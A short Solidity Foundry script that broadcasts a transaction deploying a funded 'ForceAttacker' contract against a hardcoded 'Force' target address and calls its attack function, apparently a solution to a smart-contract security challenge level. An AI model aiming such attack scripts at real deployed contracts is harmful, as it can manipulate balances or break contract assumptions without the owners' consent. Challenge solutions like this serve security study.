// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force.sol";
import {ForceAttacker} from "../src/ForceAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract ForceAttackerScript is Script {
    Force target;
    ForceAttacker attacker;

    function run() public {
        target = Force(0x99F16fC55A0D6709dAeE12EF204d8041754aEaec);
        vm.startBroadcast();

        attacker = (new ForceAttacker){value: 1000000 gwei}(address(target)); 
        attacker.attack();

        vm.stopBroadcast();
    }

 
}